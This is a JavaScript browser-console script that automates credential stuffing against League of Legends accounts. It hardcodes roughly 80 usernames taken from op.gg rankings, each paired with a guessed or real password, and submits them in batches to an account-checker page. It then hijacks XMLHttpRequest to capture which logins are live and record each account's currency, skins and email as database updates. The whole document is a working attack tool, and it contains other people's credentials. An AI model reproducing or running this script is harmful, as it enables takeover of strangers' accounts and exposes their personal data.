(async () => {
  const copyToClipboard = str => {
    const el = document.createElement('textarea');
    el.value = str;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
  };
  const list = document.getElementById('cclist');
  const server = document.getElementById('server');
  let accounts =
  [
      {
          "UserName" : "LunaspiriT",
          "Password" : "D74516EFD92B4C519790028eca157b7a",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=178998"
      },
      {
          "UserName" : "KLEOACKII1337",
          "Password" : "KLEOACKII1337",
          "FromUrl" : "https://ru.op.gg/ranking/level/page=44179"
      },
      {
          "UserName" : "Tomy9287",
          "Password" : "Tomy9287",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=57048"
      },
      {
          "UserName" : "Luxana98",
          "Password" : "luxana98"
      },
      {
          "UserName" : "bobbyjayblack21",
          "Password" : "42887E78C81C4DE4314ed994f9ab6d9",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=178988"
      },
      {
          "UserName" : "ada4511a",
          "Password" : "ada4511a",
          "FromUrl" : "https://br.op.gg/ranking/level/page=30000"
      },
      {
          "UserName" : "verybu17",
          "Password" : "verybu17",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16700"
      },
      {
          "UserName" : "Takakaranomur0",
          "Password" : "takakaranomur0",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29963"
      },
      {
          "UserName" : "LeagueOfLapdance",
          "Password" : "leagueoflapdance123",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94962"
      },
      {
          "UserName" : "erhphpdgpodfkh",
          "Password" : "erhphpdgpodfkh1",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15960"
      },
      {
          "UserName" : "LOKED52",
          "Password" : "loked52",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16663"
      },
      {
          "UserName" : "NaberMoruk41",
          "Password" : "nabermoruk41",
          "FromUrl" : "https://tr.op.gg/ranking/level/page=19454"
      },
      {
          "UserName" : "Maiquini",
          "Password" : "maiquini123",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16661"
      },
      {
          "UserName" : "kNightfury10",
          "Password" : "knightfury10",
          "FromUrl" : "https://na.op.gg/ranking/level/page=66462"
      },
      {
          "UserName" : "Kromulax343",
          "Password" : "kromulax343",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16663"
      },
      {
          "UserName" : "Bachrius",
          "Password" : "Bachrius123",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29452"
      },
      {
          "UserName" : "Merunix",
          "Password" : "Merunix123",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94962"
      },
      {
          "UserName" : "Ezequi",
          "Password" : "ezequi123",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16663"
      },
      {
          "UserName" : "edvaldo21",
          "Password" : "edvaldo21",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29453"
      },
      {
          "UserName" : "doridori1919",
          "Password" : "doridori1919",
          "FromUrl" : "https://jp.op.gg/ranking/level/page=3890"
      },
      {
          "UserName" : "Titan2135",
          "Password" : "titan2135",
          "FromUrl" : "https://tr.op.gg/ranking/level/page=19961"
      },
      {
          "UserName" : "AASCSOSA",
          "Password" : "aascsosa12",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16661"
      },
      {
          "UserName" : "deibittre1",
          "Password" : "deibittre1",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16661"
      },
      {
          "UserName" : "WolfBangBang",
          "Password" : "wolfbangbang123",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29961"
      },
      {
          "UserName" : "xDeathForeverx",
          "Password" : "abc123",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16663"
      },
      {
          "UserName" : "gutogota123",
          "Password" : "gutogota123",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29962"
      },
      {
          "UserName" : "gustavodo40",
          "Password" : "gustavodo401",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29452"
      },
      {
          "UserName" : "xtxOak",
          "Password" : "xtxOak1",
          "FromUrl" : "https://na.op.gg/ranking/level/page=65948"
      },
      {
          "UserName" : "yuyOgre",
          "Password" : "yuyOgre1",
          "FromUrl" : "https://na.op.gg/ranking/level/page=65948"
      },
      {
          "UserName" : "Jiga1UP",
          "Password" : "jiga1up",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=165201"
      },
      {
          "UserName" : "Intense292",
          "Password" : "intense292",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94449"
      },
      {
          "UserName" : "Darklordrox",
          "Password" : "darklordrox123",
          "FromUrl" : "https://oce.op.gg/ranking/level/page=6491"
      },
      {
          "UserName" : "NymphomaNN",
          "Password" : "nymphomann1",
          "FromUrl" : "https://tr.op.gg/ranking/level/page=19437"
      },
      {
          "UserName" : "Ichigo1750",
          "Password" : "ichigo1750",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50991"
      },
      {
          "UserName" : "Dragox7172",
          "Password" : "dragox7172",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15444"
      },
      {
          "UserName" : "WaffleCream",
          "Password" : "wafflecream1",
          "FromUrl" : "https://oce.op.gg/ranking/level/page=6471"
      },
      {
          "UserName" : "Tatane123",
          "Password" : "tatane123",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94428"
      },
      {
          "UserName" : "Espejo64",
          "Password" : "espejo64",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16128"
      },
      {
          "UserName" : "lukasinos07",
          "Password" : "lukasinos07",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50988"
      },
      {
          "UserName" : "Brancisco",
          "Password" : "brancisco1",
          "FromUrl" : "https://oce.op.gg/ranking/level/page=6470"
      },
      {
          "UserName" : "picpick",
          "Password" : "picpick123",
          "FromUrl" : "https://www.op.gg/ranking/level/page=82928"
      },
      {
          "UserName" : "srcn42",
          "Password" : "srcn42",
          "FromUrl" : "https://tr.op.gg/ranking/level/page=19422"
      },
      {
          "UserName" : "Mica820028",
          "Password" : "mica820028",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15440"
      },
      {
          "UserName" : "hellcrey",
          "Password" : "hellcrey123",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16126"
      },
      {
          "UserName" : "Quotennescha",
          "Password" : "abc123",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94422"
      },
      {
          "UserName" : "malrbyy194",
          "Password" : "malrbyy194",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50984"
      },
      {
          "UserName" : "Koksunio1",
          "Password" : "koksunio1",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50983"
      },
      {
          "UserName" : "fitipaly",
          "Password" : "fitipaly1",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94423"
      },
      {
          "UserName" : "kelin1115",
          "Password" : "kelin1115",
          "FromUrl" : "https://ru.op.gg/ranking/level/page=17220"
      },
      {
          "UserName" : "doticnaosoba123",
          "Password" : "doticnaosoba123",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50983"
      },
      {
          "UserName" : "PabloATR",
          "Password" : "pabloatr123",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15434"
      },
      {
          "UserName" : "soyvalentino08",
          "Password" : "soyvalentino08",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15438"
      },
      {
          "UserName" : "BLANQUITO67",
          "Password" : "blanquito67",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15439"
      },
      {
          "UserName" : "cataphyllary71",
          "Password" : "abc123",
          "FromUrl" : "https://na.op.gg/ranking/level/page=65911"
      },
      {
          "UserName" : "Hermes123456",
          "Password" : "hermes123456",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15418"
      },
      {
          "UserName" : "taklaci03",
          "Password" : "taklaci03",
          "FromUrl" : "https://tr.op.gg/ranking/level/page=19401"
      },
      {
          "UserName" : "litexak",
          "Password" : "litexak123",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94399"
      },
      {
          "UserName" : "xalejo20x",
          "Password" : "xalejo20x",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16098"
      },
      {
          "UserName" : "Gonzalo220600",
          "Password" : "gonzalo220600",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15418"
      },
      {
          "UserName" : "efeeniyi",
          "Password" : "efeeniyi1234",
          "FromUrl" : "https://tr.op.gg/ranking/level/page=19406"
      },
      {
          "UserName" : "CoffeeGurl",
          "Password" : "coffeegurl1",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50961"
      },
      {
          "UserName" : "Daidon",
          "Password" : "abc123",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29404"
      },
      {
          "UserName" : "MimiDeBaba",
          "Password" : "mimidebaba1",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94396"
      },
      {
          "UserName" : "pitufoloco58",
          "Password" : "pitufoloco58",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15419"
      },
      {
          "UserName" : "snyx95460",
          "Password" : "snyx95460",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94396"
      },
      {
          "UserName" : "WandinhaBR",
          "Password" : "wandinhabr1",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29398"
      },
      {
          "UserName" : "FilleBellee",
          "Password" : "FilleBellee123",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50961"
      },
      {
          "UserName" : "SuntMamaTa",
          "Password" : "suntmamata1",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50964"
      },
      {
          "UserName" : "eminxxx08",
          "Password" : "eminxxx08",
          "FromUrl" : "https://tr.op.gg/ranking/level/page=19395"
      },
      {
          "UserName" : "metalito777",
          "Password" : "10fc816b36164009b45106944199a80c",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15411"
      },
      {
          "UserName" : "riesga09",
          "Password" : "riesga09",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16097"
      },
      {
          "UserName" : "LEMONlion24",
          "Password" : "LEMONlion24",
          "FromUrl" : "https://euw.op.gg/ranking/level/page=94390"
      },
      {
          "UserName" : "darkfire879",
          "Password" : "darkfire879",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15403"
      },
      {
          "UserName" : "Nicolast10",
          "Password" : "nicolast10",
          "FromUrl" : "https://las.op.gg/ranking/level/page=15402"
      },
      {
          "UserName" : "logicoolg003",
          "Password" : "logicoolg003",
          "FromUrl" : "https://jp.op.gg/ranking/level/page=14273"
      },
      {
          "UserName" : "jarh007",
          "Password" : "jarh007",
          "FromUrl" : "https://lan.op.gg/ranking/level/page=16081"
      },
      {
          "UserName" : "temo1010",
          "Password" : "temo1010",
          "FromUrl" : "https://ru.op.gg/ranking/level/page=17195"
      },
      {
          "UserName" : "miticomitico",
          "Password" : "miticomitico123",
          "FromUrl" : "https://br.op.gg/ranking/level/page=29391"
      },
      {
          "UserName" : "mane1717",
          "Password" : "mane1717",
          "FromUrl" : "https://eune.op.gg/ranking/level/page=50948"
      }
  ];
  const serverMapper = {
    "1": url => (url || '').startsWith("https://br.op.gg"),
    "2": url => (url || '').startsWith("https://eune.op.gg"),
    "3": url => (url || '').startsWith("https://euw.op.gg"),
    "4": url => (url || '').startsWith("https://jp.op.gg"),
    "5": url => (url || '').startsWith("https://www.op.gg"),
    "6": url => (url || '').startsWith("https://lan.op.gg"),
    "7": url => (url || '').startsWith("https://las.op.gg"),
    "8": url => (url || '').startsWith("https://na.op.gg"),
    "9": url => (url || '').startsWith("https://oce.op.gg"),
    "11": url => (url || '').startsWith("https://ru.op.gg"),
    "12": url => (url || '').startsWith("https://tr.op.gg"),
    GetAccounts() {
      const keys = Object.keys(this);
      const accs = {};
      for (let i = 0; i < keys.length; i += 1) {
        if (isNaN(+keys[i])) continue;
        for (let ii = 0; ii < accounts.length; ii += 1) {
          if (this[keys[i]](accounts[ii].FromUrl)) {
            if (!accs[keys[i]]) accs[keys[i]] = [];
            accs[keys[i]].push(accounts[ii]);
          }
        }
      }
      return accs;
    }
  };
  accounts = serverMapper.GetAccounts();
  const keys = Object.keys(accounts);
  let currKey = -1;
  let updates = [];
  const getUpdate = data => updates.map(update => `db.Accounts.updateOne(${JSON.stringify(update.where)}, ${JSON.stringify(update.set)})`).join(';\n');

  const oldXHR = window.XMLHttpRequest;
  function newXHR() {
      var realXHR = new oldXHR();
      realXHR.addEventListener("readystatechange", function() {
        if (realXHR.readyState !== realXHR.DONE) return;
        try {
          if (realXHR.status < 200 || realXHR.status > 299) throw new Error('Not 200');
          const body = JSON.parse(realXHR.response);
          console.log(body);
          if (body.sonuc !== 'canli') return;
          const table = document.createElement('table');
          table.innerHTML = body.icerik;
          const trs = table.getElementsByTagName('tr');
          for (let i = 0; i < trs.length; i += 1) {
            const tr = trs[i];
            const [, userData, capture] = tr.getElementsByTagName('td');
            const [UserName] = userData.innerHTML.split(':');
            let [RP, BlueEssence, Level, RefundsRemaining, TotalChamps, TotalSkins, Email, EmailVerified] = capture.innerHTML.split('<br>');
            updates.push({
              where: { UserName },
              set: {
                $set: {
                  Level: +Level.split(':')[1].trim() || 0,
                  RP: +RP.split(':')[1].trim() || 0,
                  BlueEssence: +BlueEssence.split(':')[1].trim() || 0,
                  RefundsRemaining: +RefundsRemaining.split(':')[1].trim() || 0,
                  TotalChamps: +TotalChamps.split(':')[1].trim() || 0,
                  TotalSkins: +TotalSkins.split(':')[1].trim() || 0,
                  Email: Email.split(':')[1].trim() || '',
                  EmailVerified: EmailVerified.split(':')[1].trim() === 'Verified',
                }
              }
            });
            console.log(updates);
            console.clear();
            console.log(getUpdate(updates));
          }
        } catch(e) {}
      }, false);
      return realXHR;
  }
  window.XMLHttpRequest = newXHR;

  // console.clear();
  function startQuery(accs) {
    if (!accs) return;
    const submit = document.getElementById('submit');
    let comboText = '';
    for (let i = 0; i < accs.length; i += 1) {
      if (i !== 0) comboText += '\n';
      comboText += accs[i].UserName + ':' + accs[i].Password;
    }
    list.value = comboText;
    server.value = keys[currKey];
    submit.click();
  }
  const start = () => {
    currKey += 1;
    updates = [];
    startQuery(accounts[keys[currKey]]);
  }
  // setTimeout(start, 1500);
  console.clear();
  console.log('accounts', accounts);
  list.addEventListener('click', start);
})();
